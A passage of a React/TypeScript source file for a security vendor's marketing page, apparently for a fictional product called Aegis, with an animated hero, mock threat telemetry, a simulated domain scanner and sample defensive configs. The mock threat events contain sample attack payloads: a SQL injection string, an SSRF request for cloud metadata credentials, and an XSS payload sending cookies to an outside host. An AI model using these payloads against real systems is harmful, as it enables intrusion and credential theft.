    return (
      <span className="sh-line" key={li}>
        {content}
      </span>
    );
  });
}

export function SculptureHero(props: SculptureHeroProps) {
  const {
    src = DEFAULTS.src,
    darkSrc = DEFAULTS.darkSrc,
    mobileSrc = DEFAULTS.mobileSrc,
    mobileDarkSrc = DEFAULTS.mobileDarkSrc,
    imageAlt = DEFAULTS.imageAlt,
    imageBackground,
    brand = DEFAULTS.brand,
    navLinks = DEFAULTS.navLinks,
    navCta = DEFAULTS.navCta,
    showNav = true,
    eyebrow = DEFAULTS.eyebrow,
    headline = DEFAULTS.headline,
    headlineAccent = DEFAULTS.headlineAccent,
    body = DEFAULTS.body,
    primaryCta = DEFAULTS.primaryCta,
    secondaryCta = DEFAULTS.secondaryCta,
    hint = DEFAULTS.hint,
    hintTouch = DEFAULTS.hintTouch,
    background: lightBackground = DEFAULTS.background,
    darkBackground = DEFAULTS.darkBackground,
    theme = "dark",
    onThemeChange,
    themeToggle = true,
    textColor,
    accentColor,
    headingFont = DEFAULTS.headingFont,
    accentFont = DEFAULTS.accentFont,
    bodyFont = DEFAULTS.bodyFont,
    loadFonts = true,
    sculptureScale = 1,
    mobileSculptureScale = 1,
    sculptureX = 0,
    sculptureY = -2,
    interactive = true,
    strength = 1.15,
    radius = 230,
    particleDensity = 1.1,
    particleSpread = 1.15,
    dotSize = 1.05,
    turbulence = 1.1,
    liquid = 1.1,
    streaks = true,
    restStyle = "image",
    returnSpeed = 1,
    ambient = true,
    ambientIntensity = 0.35,
    speed = 1,
    intro = true,
    height = "92svh",
    backdropText = "AEGIS",
    className,
    style,
  } = props;

  const rootRef = useRef<HTMLElement>(null);
  const stageRef = useRef<HTMLDivElement>(null);
  const imgRef = useRef<HTMLImageElement>(null);
  const hintRef = useRef<HTMLDivElement>(null);
  const navRef = useRef<HTMLElement>(null);
  const contentRef = useRef<HTMLDivElement>(null);
  const backdropRef = useRef<HTMLDivElement>(null);
  const engineRef = useRef<LiquidEngine | null>(null);
  const aspectRef = useRef(800 / 450);
  const [isTouch, setIsTouch] = useState(false);

  const layout = useRef({ scale: sculptureScale, mobileScale: mobileSculptureScale, x: sculptureX, y: sculptureY });
  layout.current = {
    scale: clamp(sculptureScale, 0.3, 3),
    mobileScale: clamp(mobileSculptureScale, 0.3, 3),
    x: sculptureX,
    y: sculptureY,
  };

  const [mode, setMode] = useState<"light" | "dark">(theme);
  useEffect(() => setMode(theme), [theme]);
  const background = mode === "dark" ? darkBackground : lightBackground;
  const bgRgb = useMemo(() => hexToRgb(background, [0.016, 0.035, 0.059]), [background]);
  const darkBg = bgRgb[0] * 0.2126 + bgRgb[1] * 0.7152 + bgRgb[2] * 0.0722 < 0.45;
  const fg = textColor || (darkBg ? "#F1F5F9" : DEFAULTS.textColor);
  const acc = accentColor || (darkBg ? "#38BDF8" : "#0284C7");
  const imgBgRgb = useMemo(
    () => (imageBackground ? hexToRgb(imageBackground, [0.016, 0.035, 0.059]) : null),
    [imageBackground]
  );
  const [isMobile, setIsMobile] = useState(false);
  const mobileRef = useRef(false);
  const activeSrc =
    (isMobile && mode === "dark" && (mobileDarkSrc || darkSrc)) ||
    (isMobile && mode === "light" && mobileSrc) ||
    (mode === "dark" && darkSrc) ||
    src;

  const engineOpts = (rm: boolean): EngineOptions => ({
    interactive,
    strength: clamp(strength, 0, 2),
    radius: clamp(radius, 40, 600),
    density: clamp(particleDensity, 0.15, 2),
    dotSize: clamp(dotSize, 0.2, 3),
    spread: clamp(particleSpread, 0, 2),
    turbulence: clamp(turbulence, 0, 2),
    liquid: clamp(liquid, 0, 2),
    streaks,
    restStyle,
    returnSpeed: clamp(returnSpeed, 0, 2),
    ambient,
    ambientIntensity: clamp(ambientIntensity, 0, 2),
    speed: clamp(speed, 0.25, 3),
    intro,
    reducedMotion: rm,
    bg: bgRgb,
    imgBg: imgBgRgb,
  });
  const optsRef = useRef(engineOpts);
  optsRef.current = engineOpts;

  useEffect(() => {
    if (loadFonts) injectFonts();
  }, [loadFonts]);

  const relayout = useCallback(() => {
    const root = rootRef.current;
    if (!root) return;
    const w = root.clientWidth;
    const h = root.clientHeight;
    const mob = w < 640;
    if (mob !== mobileRef.current) {
      mobileRef.current = mob;
      setIsMobile(mob);
    }
    const nav = navRef.current;
    const content = contentRef.current;
    const band = {
      top: nav ? nav.offsetTop + nav.offsetHeight + 8 : 16,
      bottom: content ? content.offsetTop - 8 : h,
    };
    if (mob && aspectRef.current < 1.3 && content) band.bottom += content.offsetHeight * 0.3;
    const rect = computeRect(w, h, aspectRef.current, band, layout.current);
    const bd = backdropRef.current;
    if (bd) {
      const chars = Math.max(1, (bd.textContent || "").length);
      bd.style.fontSize = Math.min((band.bottom - band.top) * 0.95, (w * 0.92) / (chars * 0.56)) + "px";
      bd.style.top = (band.top + band.bottom) / 2 + "px";
    }
    const img = imgRef.current;
    if (img) {
      img.style.left = rect.x + "px";
      img.style.top = rect.y + "px";
      img.style.width = rect.w + "px";
      img.style.height = rect.h + "px";
    }
    const hintEl = hintRef.current;
    if (hintEl) {
      hintEl.style.display = mob && aspectRef.current < 1.3 ? "none" : "";
      hintEl.style.left = clamp(rect.x + rect.w / 2, 80, w - 80) + "px";
      hintEl.style.top = Math.min(rect.y + rect.h * 0.95, band.bottom - 20) + "px";
    }
    engineRef.current?.resize(w, h, rect);
  }, []);

  useEffect(() => {
    const root = rootRef.current;
    const stage = stageRef.current;
    if (!root || !stage) return;
    const canvas = document.createElement("canvas");
    canvas.className = "sh-canvas";
    stage.appendChild(canvas);
    const mq = window.matchMedia("(prefers-reduced-motion: reduce)");
    const coarse = window.matchMedia("(hover: none), (pointer: coarse)");
    setIsTouch(coarse.matches);
    let engine: LiquidEngine | null = null;
    const fail = () => {
      root.dataset.gl = "off";
    };
    try {
      engine = new LiquidEngine(canvas, optsRef.current(mq.matches), fail);
      engineRef.current = engine;
    } catch {
      fail();
    }

    const ro = new ResizeObserver(() => relayout());
    ro.observe(root);
    if (navRef.current) ro.observe(navRef.current);
    if (contentRef.current) ro.observe(contentRef.current);
    const io = new IntersectionObserver((entries) => {
      for (const e of entries) engine?.setVisible(e.isIntersecting && !document.hidden);
    });
    io.observe(root);
    const onVis = () => engine?.setVisible(!document.hidden);
    document.addEventListener("visibilitychange", onVis);
    const onMq = () => engine?.setOptions({ reducedMotion: mq.matches });
    mq.addEventListener?.("change", onMq);

    const pos = (e: PointerEvent) => {
      const b = root.getBoundingClientRect();
      return [e.clientX - b.left, e.clientY - b.top] as const;
    };
    let touched = false;
    const markTouched = () => {
      if (!touched) {
        touched = true;
        root.dataset.touched = "1";
      }
    };
    const onMove = (e: PointerEvent) => {
      const [x, y] = pos(e);
      const touch = e.pointerType === "touch";
      if (touch && e.buttons === 0 && e.pressure === 0) return;
      engine?.pointer("move", x, y, touch);
      markTouched();
    };
    const onDown = (e: PointerEvent) => {
      const [x, y] = pos(e);
      engine?.pointer("down", x, y, e.pointerType === "touch");
      markTouched();
    };
    const onUp = (e: PointerEvent) => {
      const [x, y] = pos(e);
      engine?.pointer("up", x, y, e.pointerType === "touch");
    };
    const onLeave = (e: PointerEvent) => {
      const [x, y] = pos(e);
      engine?.pointer("leave", x, y, e.pointerType === "touch");
    };
    root.addEventListener("pointermove", onMove, { passive: true });
    root.addEventListener("pointerdown", onDown, { passive: true });
    root.addEventListener("pointerup", onUp, { passive: true });
    root.addEventListener("pointercancel", onUp, { passive: true });
    root.addEventListener("pointerleave", onLeave, { passive: true });

    return () => {
      ro.disconnect();
      io.disconnect();
      document.removeEventListener("visibilitychange", onVis);
      mq.removeEventListener?.("change", onMq);
      root.removeEventListener("pointermove", onMove);
      root.removeEventListener("pointerdown", onDown);
      root.removeEventListener("pointerup", onUp);
      root.removeEventListener("pointercancel", onUp);
      root.removeEventListener("pointerleave", onLeave);
      engine?.destroy();
      engineRef.current = null;
      canvas.remove();
      delete root.dataset.gl;
    };
  }, [relayout]);

  useEffect(() => {
    const root = rootRef.current;
    const engine = engineRef.current;
    if (!root) return;
    let cancelled = false;
    const image = new Image();
    image.crossOrigin = "anonymous";
    image.decoding = "async";
    const swapping = root.dataset.gl === "on";
    if (swapping) root.dataset.swap = "1";
    image.onload = () => {
      if (cancelled) return;
      aspectRef.current = image.naturalWidth / image.naturalHeight || aspectRef.current;
      relayout();
      if (engine && root.dataset.gl !== "off") {
        try {
          engine.onFirstFrame = () => {
            if (cancelled) return;
            root.dataset.gl = "on";
            delete root.dataset.swap;
          };
          engine.setImage(image);
          relayout();
        } catch {
          root.dataset.gl = "off";
        }
      } else delete root.dataset.swap;
    };
    image.onerror = () => {
      delete root.dataset.swap;
    };
    const t = window.setTimeout(() => (image.src = activeSrc), swapping ? 280 : 0);
    return () => {
      cancelled = true;
      window.clearTimeout(t);
      image.onload = null;
      image.onerror = null;
    };
  }, [activeSrc, relayout]);

  useEffect(() => {
    const e = engineRef.current;
    if (!e) return;
    const rm = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    e.setOptions(optsRef.current(rm));
  }, [
    interactive,
    strength,
    radius,
    particleDensity,
    dotSize,
    particleSpread,
    turbulence,
    liquid,
    streaks,
    restStyle,
    returnSpeed,
    ambient,
    ambientIntensity,
    speed,
    intro,
    bgRgb,
    imgBgRgb,
  ]);

  useEffect(() => {
    relayout();
  }, [sculptureScale, mobileSculptureScale, sculptureX, sculptureY, relayout]);

  const vars = {
    "--sh-bg": background,
    "--sh-fg": fg,
    "--sh-acc": acc,
    "--sh-head": headingFont,
    "--sh-accent": accentFont,
    "--sh-body": bodyFont,
    "--sh-h": height,
  } as React.CSSProperties;

  const hintText = isTouch ? hintTouch : hint;

  const handleThemeToggle = () => {
    const next = mode === "dark" ? "light" : "dark";
    setMode(next);
    onThemeChange?.(next);
  };

  return (
    <section
      id="hero-top"
      ref={rootRef}
      className={"sh-root" + (className ? " " + className : "")}
      style={{ ...vars, ...style }}
    >
      <style>{CSS}</style>
      {backdropText ? (
        <div ref={backdropRef} className="sh-backdrop" aria-hidden="true">
          {backdropText}
        </div>
      ) : null}
      <div ref={stageRef} className="sh-stage" aria-hidden="true">
        <img
          ref={imgRef}
          className="sh-fallback"
          src={activeSrc}
          alt=""
          crossOrigin="anonymous"
          draggable={false}
        />
      </div>
      <span
        style={{
          position: "absolute",
          width: 1,
          height: 1,
          overflow: "hidden",
          clip: "rect(0 0 0 0)",
        }}
      >
        {imageAlt}
      </span>

      {showNav && (
        <nav ref={navRef} className="sh-nav" aria-label="Primary">
          <a className="sh-brand" href="#hero-top">
            <ShieldCheck className="w-5 h-5 text-sky-400" />
            <span>{brand}</span>
          </a>
          <ul className="sh-links">
            {navLinks.map((l, i) => (
              <li key={i}>
                <a className="sh-link" href={l.href}>
                  {l.label}
                </a>
              </li>
            ))}
            {themeToggle && (
              <li className="sh-keep">
                <button
                  type="button"
                  className="sh-theme"
                  aria-label={
                    mode === "dark" ? "Switch to light theme" : "Switch to dark theme"
                  }
                  onClick={handleThemeToggle}
                >
                  {mode === "dark" ? <SunIcon /> : <MoonIcon />}
                </button>
              </li>
            )}
            {navCta && navCta.label && (
              <li className="sh-keep">
                <a className="sh-navcta" href={navCta.href}>
                  {navCta.label}
                </a>
              </li>
            )}
          </ul>
        </nav>
      )}

      {interactive && hintText ? (
        <div ref={hintRef} className="sh-hint" aria-hidden="true">
          {hintText}
        </div>
      ) : null}

      <div className="sh-spacer" />

      <div ref={contentRef} className="sh-content">
        <div>
          {eyebrow ? <p className="sh-eyebrow">{eyebrow}</p> : null}
          <h1 className="sh-h1">{renderHeadline(headline, headlineAccent)}</h1>
        </div>
        <div className="sh-aside">
          {body ? <p className="sh-body">{body}</p> : null}
          <div className="sh-ctas">
            {primaryCta && primaryCta.label ? (
              <a className="sh-btn" href={primaryCta.href}>
                {primaryCta.label}
                <Arrow />
              </a>
            ) : null}
            {secondaryCta && secondaryCta.label ? (
              <a className="sh-txt" href={secondaryCta.href}>
                {secondaryCta.label}
                <Arrow />
              </a>
            ) : null}
          </div>
        </div>
      </div>
    </section>
  );
}

/* ────────────────────────────────────────────────────────────────────
   Telemetry & Security Data
   ──────────────────────────────────────────────────────────────────── */

interface ThreatEvent {
  id: string;
  timestamp: string;
  vector: "SQLi / XSS" | "API Credential Stuffing" | "DDoS Botnet" | "Supply Chain SSRF";
  severity: "Critical" | "High" | "Medium";
  sourceIp: string;
  asn: string;
  targetEndpoint: string;
  latencyMs: number;
  status: "Mitigated" | "Quarantined" | "Inspecting";
  payloadSnippet: string;
  ruleId: string;
}

const INITIAL_THREATS: ThreatEvent[] = [
  {
    id: "THR-9941",
    timestamp: "Just now",
    vector: "SQLi / XSS",
    severity: "Critical",
    sourceIp: "185.220.101.44",
    asn: "AS205100 F3 Netze",
    targetEndpoint: "POST /v2/graphql/checkout",
    latencyMs: 0.34,
    status: "Mitigated",
    payloadSnippet: `{"query": "mutation { auth(user: \\"admin' UNION SELECT null,pg_sleep(5)--\\") }"}`,
    ruleId: "AEGIS-WAF-SQLI-092"
  },
  {
    id: "THR-9940",
    timestamp: "4s ago",
    vector: "API Credential Stuffing",
    severity: "High",
    sourceIp: "45.155.205.233",
    asn: "AS49870 Alsycon",
    targetEndpoint: "POST /api/v1/oauth/token",
    latencyMs: 0.29,
    status: "Mitigated",
    payloadSnippet: `POST /api/v1/oauth/token [Rate: 1,420 req/s | JA4: t13d1516h2_8daaf6152771_b186095e22b6]`,
    ruleId: "AEGIS-BOT-JA4-441"
  },
  {
    id: "THR-9939",
    timestamp: "11s ago",
    vector: "Supply Chain SSRF",
    severity: "Critical",
    sourceIp: "103.253.41.18",
    asn: "AS136907 HUAWEI-CLOUD",
    targetEndpoint: "GET /api/webhook/preview?url=http://169.254.169.254/latest/meta-data/",
    latencyMs: 0.41,
    status: "Quarantined",
    payloadSnippet: `GET /api/webhook/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    ruleId: "AEGIS-EBPF-IMDS-004"
  },
  {
    id: "THR-9938",
    timestamp: "19s ago",
    vector: "DDoS Botnet",
    severity: "High",
    sourceIp: "91.214.124.89",
    asn: "AS57523 Chang Way",
    targetEndpoint: "GET /products/search?q=%00%ff*9999",
    latencyMs: 0.22,
    status: "Mitigated",
    payloadSnippet: `HTTP/2 RAPID_RESET_STREAM [RST_STREAM flood: 48,500 frames/sec]`,
    ruleId: "AEGIS-L7-CVE202344487"
  },
  {
    id: "THR-9937",
    timestamp: "28s ago",
    vector: "SQLi / XSS",
    severity: "Medium",
    sourceIp: "194.26.29.112",
    asn: "AS44477 Stark Ind",
    targetEndpoint: "PATCH /api/v2/profile/bio",
    latencyMs: 0.37,
    status: "Inspecting",
    payloadSnippet: `{"bio": "<svg/onload=fetch('https://exfil.sh/c?d='+document.cookie)>"}`,
    ruleId: "AEGIS-DOM-XSS-118"
  },
  {
    id: "THR-9936",
    timestamp: "42s ago",
    vector: "API Credential Stuffing",
    severity: "High",
    sourceIp: "179.43.176.19",
    asn: "AS51396 Pfcloud",
    targetEndpoint: "POST /v1/Billing/VerifyCard",
    latencyMs: 0.31,
    status: "Mitigated",
    payloadSnippet: `Carding enumeration detected via residential proxy mesh (Entropy score: 0.96)`,
    ruleId: "AEGIS-FRAUD-BIN-302"
  }
];

const TELEMETRY_SERIES: Record<string, Array<{ time: string; blocked: number; clean: number; latency: number }>> = {
  "1H": [
    { time: "18:00", blocked: 14200, clean: 89000, latency: 0.36 },
    { time: "18:10", blocked: 19400, clean: 92400, latency: 0.38 },
    { time: "18:20", blocked: 48900, clean: 95100, latency: 0.41 },
    { time: "18:30", blocked: 31200, clean: 94000, latency: 0.37 },
    { time: "18:40", blocked: 22800, clean: 97500, latency: 0.35 },
    { time: "18:50", blocked: 27600, clean: 101200, latency: 0.36 },
    { time: "19:00", blocked: 34900, clean: 104800, latency: 0.35 },
  ],
  "24H": [
    { time: "00:00", blocked: 120500, clean: 840000, latency: 0.35 },
    { time: "04:00", blocked: 98400, clean: 720000, latency: 0.33 },
    { time: "08:00", blocked: 215000, clean: 1120000, latency: 0.39 },
    { time: "12:00", blocked: 384000, clean: 1490000, latency: 0.42 },
    { time: "16:00", blocked: 294000, clean: 1380000, latency: 0.38 },
    { time: "20:00", blocked: 261000, clean: 1250000, latency: 0.36 },
    { time: "23:59", blocked: 189000, clean: 980000, latency: 0.35 },
  ],
  "7D": [
    { time: "Mon", blocked: 1420000, clean: 8900000, latency: 0.37 },
    { time: "Tue", blocked: 1890000, clean: 9400000, latency: 0.38 },
    { time: "Wed", blocked: 2640000, clean: 9800000, latency: 0.40 },
    { time: "Thu", blocked: 1920000, clean: 10200000, latency: 0.36 },
    { time: "Fri", blocked: 2310000, clean: 11100000, latency: 0.37 },
    { time: "Sat", blocked: 1540000, clean: 8600000, latency: 0.34 },
    { time: "Sun", blocked: 1680000, clean: 8950000, latency: 0.35 },
  ]
};

interface ScanCheck {
  id: string;
  name: string;
  category: string;
  status: "pass" | "warn" | "fail";
  scoreImpact: number;
  finding: string;
  remediation: string;
  patchedByAegis: boolean;
}

const DOMAIN_PRESETS: Record<string, { score: number; latency: string; checks: ScanCheck[] }> = {
  "api.fintech-core.io": {
    score: 68,
    latency: "14.2ms",
    checks: [
      {
        id: "chk-1",
        name: "GraphQL Introspection & Batch Depth Limit",
        category: "API Security",
        status: "fail",
        scoreImpact: 18,
        finding: "Unbounded query depth allows nested circular fragments on /v2/graphql.",
        remediation: "Enforce AST depth limit <= 7 and complexity token bucket at Aegis Edge.",
        patchedByAegis: false
      },
      {
        id: "chk-2",
        name: "TLS 1.3 Post-Quantum Hybrid Key Exchange (X25519Kyber768)",
        category: "Cryptography",
        status: "pass",
        scoreImpact: 0,
        finding: "Strict HSTS + TLS 1.3 with OCSP stapling active across all 310 edge PoPs.",
        remediation: "No action required.",
        patchedByAegis: true
      },
      {
        id: "chk-3",
        name: "Shadow API & Zombie Endpoint Exposure",
        category: "Attack Surface",
        status: "warn",
        scoreImpact: 14,
        finding: "2 undocumented staging endpoints (/v1/debug/vars, /internal/metrics) respond without mTLS.",
        remediation: "Upload OpenAPI 3.1 schema to Aegis Positive Security Model to block unlisted routes.",
        patchedByAegis: false
      },
      {
        id: "chk-4",
        name: "Client-Side Supply Chain & CSP Nonce Integrity",
        category: "Web Perimeter",
        status: "pass",
        scoreImpact: 0,
        finding: "Strict-Dynamic CSP and Subresource Integrity (SRI) verified on 14 external scripts.",
        remediation: "No action required.",
        patchedByAegis: true
      }
    ]
  },
  "auth.cloudvault.dev": {
    score: 74,
    latency: "11.8ms",
    checks: [
      {
        id: "chk-1",
        name: "JA4+ TLS Fingerprint Bot & Credential Stuffing Shield",
        category: "Bot Mitigation",
        status: "warn",
        scoreImpact: 16,
        finding: "Headless Chromium automation bypassing standard CAPTCHA on /oauth/token.",
        remediation: "Enable Aegis Cryptographic Proof-of-Work & JA4 behavioral rate-limiting.",
        patchedByAegis: false
      },
      {
        id: "chk-2",
        name: "SSRF & Cloud Metadata IMDSv2 Egress Guard",
        category: "Cloud Runtime",
        status: "fail",
        scoreImpact: 10,
        finding: "Webhook preview parameter allows unvalidated DNS rebinding to internal RFC1918 subnets.",
        remediation: "Activate Aegis eBPF socket filter to block private CIDR egress from web workers.",
        patchedByAegis: false
      },
      {
        id: "chk-3",
        name: "Zero-Trust mTLS Service-to-Service Attestation",
        category: "Cryptography",
        status: "pass",
        scoreImpact: 0,
        finding: "SPIFFE/SPIRE short-lived X.509 certificates rotated every 15 minutes.",
        remediation: "No action required.",
        patchedByAegis: true
      },
      {
        id: "chk-4",
        name: "HTTP/2 Rapid Reset & Continuation Flood Protection",
        category: "DDoS L7",
        status: "pass",
        scoreImpact: 0,
        finding: "Per-stream frame quotas enforced in kernel XDP before TLS termination.",
        remediation: "No action required.",
        patchedByAegis: true
      }
    ]
  },
  "checkout.globalretail.com": {
    score: 61,
    latency: "19.5ms",
    checks: [
      {
        id: "chk-1",
        name: "PCI-DSS 4.0 Req 6.4.3 Payment Page Script Tampering",
        category: "Compliance & Skimming",
        status: "fail",
        scoreImpact: 22,
        finding: "3 third-party analytics tags on /checkout have mutable DOM access to card inputs.",
        remediation: "Isolate third-party scripts via Aegis Page Shield & block unauthorized outbound beacons.",
        patchedByAegis: false
      },
      {
        id: "chk-2",
        name: "SQL Injection & NoSQL Operator Sanitization",
        category: "WAF Core",
        status: "warn",
        scoreImpact: 17,
        finding: "Legacy search filter accepts unescaped JSON operators ($ne, $regex) in query string.",
        remediation: "Deploy Aegis Semantic AST WAF rule set for MongoDB/PostgreSQL payloads.",
        patchedByAegis: false
      },
      {
        id: "chk-3",
        name: "Carding & BIN Enumeration Velocity Control",
        category: "Fraud Defense",
        status: "pass",
        scoreImpact: 0,
        finding: "Sliding-window velocity checks active across distributed edge state.",
        remediation: "No action required.",
        patchedByAegis: true
      },
      {
        id: "chk-4",
        name: "Global Anycast DDoS Scrubbing Capacity",
        category: "DDoS L7",
        status: "pass",
        scoreImpact: 0,
        finding: "Connected to 248 Tbps Anycast scrubbing mesh with 0ms failover.",
        remediation: "No action required.",
        patchedByAegis: true
      }
    ]
  }
};

const ARCHITECTURE_MODULES = [
  {
    id: "waf",
    title: "Autonomous Semantic WAF & L7 DDoS Mesh",
    badge: "0.35ms p99 Latency",
    summary:
      "Traditional regex WAFs break legitimate traffic and miss polymorphic zero-days. Aegis compiles payloads into Abstract Syntax Trees (AST) at the edge in under 350 microseconds.",
    metrics: [
      { label: "False Positive Rate", value: "< 0.0008%" },
      { label: "Anycast Scrubbing Capacity", value: "248 Tbps" },
      { label: "Zero-Day Virtual Patch SLA", value: "< 45 sec" }
    ],
    codeTitle: "aegis-edge-policy.ts (Next.js / Edge Middleware Integration)",
    code: `import { createAegisShield } from "@aegis-sec/edge-sdk";

export const aegis = createAegisShield({
  mode: "BLOCK_AND_ATTEST",
  engine: {
    semanticAstInspection: ["sqli", "xss", "log4j", "ssrf", "proto-pollution"],
    ja4BotFingerprinting: { challengeThreshold: 0.82, powDifficulty: 4 },
    http2RapidResetGuard: true,
  },
  telemetry: {
    streamToSiem: "wss://siem.aegis-sec.io/v2/ingest",
    redactPiiFields: ["password", "pan", "cvv", "authorization"],
  },
});

export default aegis.protect();`
  },
  {
    id: "api",
    title: "Autonomous API Discovery & Schema Enforcement",
    badge: "OpenAPI 3.1 + GraphQL AST",
    summary:
      "Continuously maps every REST, GraphQL, and gRPC route from live traffic, flags shadow or zombie endpoints, and blocks any request that violates your strict schema contract.",
    metrics: [
      { label: "Shadow Endpoints Discovered", value: "100% Auto-Mapped" },
      { label: "BOLA / IDOR Anomaly Detection", value: "Real-Time eBPF" },
      { label: "PII Tokenization", value: "In-Flight Edge" }
    ],
    codeTitle: "aegis-graphql-guard.yaml (Positive Security Contract)",
    code: `apiVersion: security.aegis.io/v1alpha2
kind: ApiPerimeterContract
metadata:
  name: fintech-core-graphql-shield
spec:
  targetHost: api.fintech-core.io
  graphql:
    disableIntrospectionInProd: true
    maxQueryDepth: 7
    maxCostTokensPerSecond: 1500
    fieldLevelAuth:
      - path: "Query.userFinancialRecords"
        requireMtlsSpiffeId: "spiffe://prod.fintech/ns/ledger/sa/reader"
  driftAction: QUARANTINE_AND_ALERT_SOC`
  },
  {
    id: "ebpf",
    title: "Kernel-Level eBPF Runtime & SSRF Prevention",
    badge: "Zero Sidecar Overhead",
    summary:
      "Attaches directly to Linux kernel tracepoints across Kubernetes nodes to stop container escapes, unauthorized binary execution, and cloud metadata (IMDS) credential theft.",
    metrics: [
      { label: "CPU Overhead", value: "< 0.9% Node CPU" },
      { label: "Syscall Visibility", value: "100% Kernel Ring" },
      { label: "Container Escape Block", value: "Synchronous LSM" }
    ],
    codeTitle: "aegis-lsm-probe.c (eBPF LSM Socket Egress Filter)",
    code: `SEC("lsm/socket_connect")
int BPF_PROG(aegis_prevent_imds_ssrf, struct socket *sock,
             struct sockaddr *address, int addrlen) {
    if (address->sa_family != AF_INET) return 0;
    struct sockaddr_in *addr = (struct sockaddr_in *)address;
    __u32 dest_ip = bpf_ntohl(addr->sin_addr.s_addr);

    // Block unauthorized pod egress to Cloud Metadata 169.254.169.254
    if (dest_ip == 0xA9FEA9FE && !is_authorized_iam_agent()) {
        aegis_emit_ringbuf_alert(ALERT_CRITICAL_SSRF_IMDS, dest_ip);
        return -EPERM; // Dropped synchronously in kernel
    }
    return 0;
}`
  },
  {
    id: "supplychain",
    title: "Client-Side Supply Chain & Magecart Page Shield",
    badge: "PCI-DSS 4.0 Ready",
    summary:
      "Monitors every third-party script running in your customers' browsers, preventing DOM skimming, credential harvesting, and unauthorized outbound data exfiltration.",
    metrics: [
      { label: "PCI-DSS 4.0 Req 6.4.3 & 11.6.1", value: "Automated Audit" },
      { label: "DOM Mutation Telemetry", value: "Zero UX Impact" },
      { label: "Malicious Script Quarantine", value: "Instant CSP Update" }
    ],
    codeTitle: "aegis-page-shield-policy.json (Browser Integrity Manifest)",
    code: `{
  "policyId": "pci-dss-4-checkout-lockdown",
  "protectedSelectors": ["#card-number", "#cvv-input", "input[name='ssn']"],
  "allowedScriptHashes": [
    "sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  ],
  "exfiltrationGuard": {
    "allowedConnectDomains": ["https://api.fintech-core.io", "https://js.stripe.com"],
    "onUnauthorizedFetch": "BLOCK_AND_CAPTURE_STACKTRACE"
  }
}`
  }
];

const COMPLIANCE_FRAMEWORKS = [
  {
    id: "soc2",
    name: "SOC 2 Type II",
    coverage: "98% Automated Controls",
    controls: 114,
    status: "Continuous Attestation",
    desc: "Automated evidence collection for CC6.1 (Logical Access), CC6.6 (Boundary Protection), and CC7.2 (Anomaly Monitoring)."
  },
  {
    id: "iso27001",
    name: "ISO/IEC 27001:2022",
    coverage: "96% Annex A Mapped",
    controls: 93,
    status: "Verified Certified",
    desc: "Cryptographic key lifecycle management, immutable audit trails, and zero-trust network segmentation mapped to Annex A.8."
  },
  {
    id: "pcidss",
    name: "PCI-DSS v4.0",
    coverage: "100% Req 6.4.3 & 11.6.1",
    controls: 64,
    status: "QSA Audit-Ready",
    desc: "Full payment page script inventory, cryptographic SRI verification, and tamper-detection alerts required for 2025/2026 mandates."
  },
  {
    id: "hipaa",
    name: "HIPAA & HITECH",
    coverage: "100% ePHI Edge Redaction",
    controls: 48,
    status: "BAA Included",
    desc: "In-flight field-level encryption and automatic PII/ePHI redaction before logs ever reach downstream observability pipelines."
  }
];

/* ────────────────────────────────────────────────────────────────────
   Main Cybersecurity Web Page Application
   ──────────────────────────────────────────────────────────────────── */

export default function App() {
  const [theme, setTheme] = useState<"light" | "dark">("dark");

  // Live Hero Particle Tuning Controls
  const [showHeroControls, setShowHeroControls] = useState(false);
  const [heroRestStyle, setHeroRestStyle] = useState<"image" | "particles">("image");
  const [heroLiquid, setHeroLiquid] = useState(1.15);
  const [heroTurbulence, setHeroTurbulence] = useState(1.1);
  const [heroSpread, setHeroSpread] = useState(1.15);
  const [heroStreaks, setHeroStreaks] = useState(true);

  // Domain Scanner State
  const [scanDomain, setScanDomain] = useState("api.fintech-core.io");
  const [customDomainInput, setCustomDomainInput] = useState("api.fintech-core.io");
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(100);
  const [patchedIds, setPatchedIds] = useState<Record<string, boolean>>({});

  // Threat Telemetry State
  const [timeWindow, setTimeWindow] = useState<"1H" | "24H" | "7D">("24H");
  const [vectorFilter, setVectorFilter] = useState<string>("All");
  const [threats, setThreats] = useState<ThreatEvent[]>(INITIAL_THREATS);
  const [selectedThreat, setSelectedThreat] = useState<ThreatEvent | null>(null);

  // Architecture Explorer State
  const [activeArchTab, setActiveArchTab] = useState("waf");
  const [copiedCode, setCopiedCode] = useState(false);

  // Pricing & ROI State
  const [annualBilling, setAnnualBilling] = useState(true);
  const [monthlyRequestsM, setMonthlyRequestsM] = useState(120);
  const [activeModal, setActiveModal] = useState<null | { title: string; subtitle: string; mode: "deploy" | "audit" }>(null);
  const [deployEmail, setDeployEmail] = useState("");
  const [deployOrg, setDeployOrg] = useState("");
  const [deploySubmitted, setDeploySubmitted] = useState(false);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const triggerToast = useCallback((msg: string) => {
    setToastMessage(msg);
    window.setTimeout(() => {
      setToastMessage((prev) => (prev === msg ? null : prev));
    }, 3400);
  }, []);

  const copyTextSafe = useCallback((text: string, label: string) => {
    const fallbackCopy = () => {
      const ta = document.createElement("textarea");
      ta.value = text;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      triggerToast(`${label} copied to clipboard`);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(
        () => triggerToast(`${label} copied to clipboard`),
        fallbackCopy
      );
    } else {
      fallbackCopy();
    }
  }, [triggerToast]);

  const handleRunScan = (targetDomain?: string) => {
    const clean = (targetDomain ?? customDomainInput).trim().toLowerCase() || "api.fintech-core.io";
    setCustomDomainInput(clean);
    setIsScanning(true);
    setScanProgress(12);
    const matchedPreset = DOMAIN_PRESETS[clean] ? clean : "api.fintech-core.io";
    setScanDomain(matchedPreset);

    let step = 12;
    const interval = window.setInterval(() => {
      step += 24;
      if (step >= 100) {
        setScanProgress(100);
        setIsScanning(false);
        window.clearInterval(interval);
        triggerToast(`Perimeter audit completed for ${clean}`);
      } else {
        setScanProgress(step);
      }
    }, 180);
  };

  const currentScanData = DOMAIN_PRESETS[scanDomain] || DOMAIN_PRESETS["api.fintech-core.io"];
  const effectiveChecks = useMemo(() => {
    return currentScanData.checks.map((c) => {
      const key = `${scanDomain}-${c.id}`;
      const isPatched = c.patchedByAegis || !!patchedIds[key];
      return {
        ...c,
